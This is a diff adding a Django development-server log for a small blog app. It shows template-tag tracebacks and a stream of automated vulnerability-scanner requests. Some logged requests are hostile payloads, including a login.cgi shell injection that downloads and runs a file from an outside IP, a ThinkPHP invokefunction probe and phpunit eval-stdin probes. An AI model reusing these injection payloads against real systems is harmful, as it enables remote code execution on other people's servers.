+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 534, in invalid_block_tag
+    "or load this tag?" % (token.lineno, command)
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 5: 'static'. Did you forget to register or load this tag?
+[17/Jan/2021 15:47:53] "GET /auth/login HTTP/1.1" 500 132702
+[17/Jan/2021 15:48:37] "GET /auth/login HTTP/1.1" 200 2116
+Not Found: /boaform/admin/formLogin
+[17/Jan/2021 15:52:23] "POST /boaform/admin/formLogin HTTP/1.1" 404 2285
+Not Found: /tools.cgi
+[17/Jan/2021 16:04:19] "POST /tools.cgi HTTP/1.1" 404 2243
+[17/Jan/2021 16:05:15] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-includes/js/jquery/jquery.js
+[17/Jan/2021 16:05:15] "GET /wp-includes/js/jquery/jquery.js HTTP/1.1" 404 2304
+Not Found: /administrator/help/en-GB/toc.json
+[17/Jan/2021 16:05:16] "GET /administrator/help/en-GB/toc.json HTTP/1.1" 404 2310
+Not Found: /administrator/language/en-GB/install.xml
+[17/Jan/2021 16:05:17] "GET /administrator/language/en-GB/install.xml HTTP/1.1" 404 2331
+Not Found: /plugins/system/debug/debug.xml
+[17/Jan/2021 16:05:17] "GET /plugins/system/debug/debug.xml HTTP/1.1" 404 2301
+Not Found: /administrator/
+[17/Jan/2021 16:05:18] "GET /administrator/ HTTP/1.1" 404 2253
+Not Found: /misc/ajax.js
+[17/Jan/2021 16:05:19] "GET /misc/ajax.js HTTP/1.1" 404 2247
+[17/Jan/2021 16:05:19] "GET / HTTP/1.1" 200 1750
+Not Found: /admin/view/javascript/common.js
+[17/Jan/2021 16:05:20] "GET /admin/view/javascript/common.js HTTP/1.1" 404 4052
+Not Found: /admin/includes/general.js
+[17/Jan/2021 16:05:21] "GET /admin/includes/general.js HTTP/1.1" 404 4034
+Not Found: /images/editor/separator.gif
+[17/Jan/2021 16:05:21] "GET /images/editor/separator.gif HTTP/1.1" 404 2292
+Not Found: /js/header-rollup-554.js
+[17/Jan/2021 16:05:22] "GET /js/header-rollup-554.js HTTP/1.1" 404 2280
+Not Found: /vendor/phpunit/phpunit/build.xml
+[17/Jan/2021 16:05:22] "GET /vendor/phpunit/phpunit/build.xml HTTP/1.1" 404 2307
+Not Found: /fckeditor/editor/filemanager/connectors/php/upload.php
+[17/Jan/2021 16:05:23] "GET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media HTTP/1.1" 404 2384
+Not Found: /.env
+[17/Jan/2021 16:05:24] "GET /.env HTTP/1.1" 404 2223
+[17/Jan/2021 16:05:24] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-admin/setup-config.php
+[17/Jan/2021 16:05:25] "GET /wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2293
+Not Found: /wordpress/wp-admin/setup-config.php
+[17/Jan/2021 16:05:25] "GET /wordpress/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2323
+Not Found: /wp/wp-admin/setup-config.php
+[17/Jan/2021 16:05:26] "GET /wp/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2302
+Not Found: /blog/wp-admin/setup-config.php
+[17/Jan/2021 16:05:27] "GET /blog/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2308
+Not Found: /test/wp-admin/setup-config.php
+[17/Jan/2021 16:05:27] "GET /test/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2308
+Not Found: /site/wp-admin/setup-config.php
+[17/Jan/2021 16:05:28] "GET /site/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2308
+Not Found: /boaform/admin/formLogin
+[17/Jan/2021 16:14:45] "POST /boaform/admin/formLogin HTTP/1.1" 404 2285
+[17/Jan/2021 16:25:30] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 16:49:29] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-admin/install.php
+[17/Jan/2021 17:10:33] "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 2278
+Not Found: /wp-admin/setup-config.php
+[17/Jan/2021 17:10:36] "GET /wp-admin/setup-config.php?step=1 HTTP/1.1" 404 2293
+[17/Jan/2021 17:20:16] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 17:23:47] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 17:25:35] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 17:25:43] "GET / HTTP/1.1" 200 1750
+Not Found: /favicon.ico
+[17/Jan/2021 17:25:56] "GET /favicon.ico HTTP/1.1" 404 2244
+----------------------------------------
+Exception happened during processing of request from ('54.186.18.40', 35008)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[17/Jan/2021 17:26:06] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 17:35:16] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 18:06:48] "GET / HTTP/1.1" 200 1750
+Not Found: /config/getuser
+[17/Jan/2021 18:12:02] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[17/Jan/2021 18:48:27] "GET / HTTP/1.1" 200 1750
+Not Found: /wordpress/
+[17/Jan/2021 18:48:28] "GET /wordpress/ HTTP/1.1" 404 2241
+[17/Jan/2021 18:57:12] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 18:58:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[17/Jan/2021 18:58:35] "  /*à     Cookie: mstshash=Administr" 400 -
+[17/Jan/2021 19:12:04] "GET / HTTP/1.1" 200 1750
+Not Found: /admin/index.php
+[17/Jan/2021 19:25:34] "GET /admin/index.php HTTP/1.1" 404 4004
+[17/Jan/2021 19:28:04] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-admin/setup-config.php
+[17/Jan/2021 19:28:12] "GET /wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1" 404 2312
+Not Found: /wp-admin/install.php
+[17/Jan/2021 19:28:16] "GET /wp-admin/install.php?step=1&language=en_GB HTTP/1.1" 404 2297
+Not Found: /hudson
+[17/Jan/2021 19:43:07] "GET /hudson HTTP/1.1" 404 2230
+[17/Jan/2021 19:51:34] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 19:59:12] "GET / HTTP/1.0" 200 1750
+[17/Jan/2021 20:18:06] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 20:18:50] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 20:18:51] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:51] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[17/Jan/2021 20:18:51] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[17/Jan/2021 20:18:52] "GET / HTTP/1.1" 200 1750
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:52] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:52] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:53] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:53] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:54] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:54] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2020/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:54] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:55] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:55] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:55] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:56] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:56] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:56] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:57] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:18:57] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /login.cgi
+[17/Jan/2021 20:25:19] "GET /login.cgi?cli=aa%20aa%27;wget%20http://193.239.147.182/d%20-O%20-%3E%20/tmp/ff;chmod%20+x%20/tmp/ff;sh%20/tmp/ff%27$ HTTP/1.1" 404 2345
+[17/Jan/2021 20:25:57] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 20:25:57] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:25:58] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[17/Jan/2021 20:25:58] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[17/Jan/2021 20:25:59] "GET / HTTP/1.1" 200 1750
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:25:59] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:00] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:00] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:01] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:02] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:02] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2020/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:03] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:03] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:04] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:04] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:05] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:05] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:06] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:06] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:26:07] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[17/Jan/2021 20:37:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[17/Jan/2021 20:37:04] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[17/Jan/2021 20:40:59] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2365
+[17/Jan/2021 20:40:59] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2366
+[17/Jan/2021 20:40:59] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1750
+[17/Jan/2021 20:40:59] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 1750
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[17/Jan/2021 20:41:00] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 2350
+Not Found: /console/
+[17/Jan/2021 20:41:00] "GET /console/ HTTP/1.1" 404 2239
+Not Found: /Autodiscover/Autodiscover.xml
+[17/Jan/2021 20:41:01] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2303
+Not Found: /api/jsonws/invoke
+[17/Jan/2021 20:41:01] "POST /api/jsonws/invoke HTTP/1.1" 404 2267
+Not Found: /index.php
+[17/Jan/2021 20:41:01] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 2361
+Not Found: /solr/admin/info/system
+[17/Jan/2021 20:41:01] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2289
+[17/Jan/2021 20:42:00] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 20:42:01] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:01] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[17/Jan/2021 20:42:02] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[17/Jan/2021 20:42:02] "GET / HTTP/1.1" 200 1750
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:03] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:03] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:04] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:04] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:05] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:05] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:06] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:06] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:07] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:07] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:08] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:09] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:09] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:10] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:10] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[17/Jan/2021 20:42:11] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[17/Jan/2021 20:54:30] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:04:09] "GET / HTTP/1.1" 200 1750
+Not Found: /wp-includes/wlwmanifest.xml
+[17/Jan/2021 21:04:09] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[17/Jan/2021 21:04:09] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[17/Jan/2021 21:04:10] "GET / HTTP/1.1" 200 1750
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[17/Jan/2021 21:04:10] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[17/Jan/2021 21:04:11] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[17/Jan/2021 21:04:11] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /site/wp-includes/wlwmanifest.xml
+[17/Jan/2021 21:04:12] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[17/Jan/2021 21:04:12] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+[17/Jan/2021 21:09:23] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[17/Jan/2021 21:09:23] "  à          " 400 -
+Not Found: /robots.txt
+[17/Jan/2021 21:19:41] "GET /robots.txt HTTP/1.1" 404 2241
+[17/Jan/2021 21:19:52] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:20:30] "GET /auth/login HTTP/1.1" 200 2116
+[17/Jan/2021 21:20:42] "GET /auth/signup HTTP/1.1" 200 2690
+[17/Jan/2021 21:38:07] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:38:07] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[17/Jan/2021 21:38:07] "GET /static/css/blog_base_total.css HTTP/1.1" 304 0
+[17/Jan/2021 21:38:07] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[17/Jan/2021 21:38:07] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[17/Jan/2021 21:38:11] "GET /auth/login HTTP/1.1" 200 2116
+[17/Jan/2021 21:38:12] "GET /auth/signup HTTP/1.1" 200 2690
+Internal Server Error: /auth/signup
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 39, in signup_view
+    user = Account.objects.create_user(username,email,password)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 146, in create_user
+    return self._create_user(username, email, password, **extra_fields)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 135, in _create_user
+    raise ValueError('The given username must be set')
+ValueError: The given username must be set
+[17/Jan/2021 21:38:16] "POST /auth/signup HTTP/1.1" 500 71879
+Not Found: /favicon.ico
+[17/Jan/2021 21:38:17] "GET /favicon.ico HTTP/1.1" 404 2242
+[17/Jan/2021 21:38:22] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:38:23] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:38:24] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:38:25] "GET /auth/login HTTP/1.1" 200 2116
+Not Found: /config/getuser
+[17/Jan/2021 21:38:45] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[17/Jan/2021 21:38:46] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:39:39] "GET / HTTP/1.1" 200 1750
+[17/Jan/2021 21:39:39] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[17/Jan/2021 21:39:39] "GET /static/css/blog_base_total.css HTTP/1.1" 304 0
+[17/Jan/2021 21:39:39] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[17/Jan/2021 21:39:39] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[17/Jan/2021 21:39:44] "GET /auth/login HTTP/1.1" 200 2116
+[17/Jan/2021 21:39:47] "GET /auth/signup HTTP/1.1" 200 2690
+[17/Jan/2021 21:43:48] "GET /auth/login HTTP/1.1" 200 2271
+[17/Jan/2021 21:44:50] "GET /auth/login HTTP/1.1" 200 2271
+[17/Jan/2021 21:44:50] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 4: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 21:46:40] "GET /auth/login HTTP/1.1" 500 147070
+Not Found: /favicon.ico
+[17/Jan/2021 21:46:40] "GET /favicon.ico HTTP/1.1" 404 2244
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 7: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 21:47:33] "GET /auth/login HTTP/1.1" 500 148245
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'stati'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
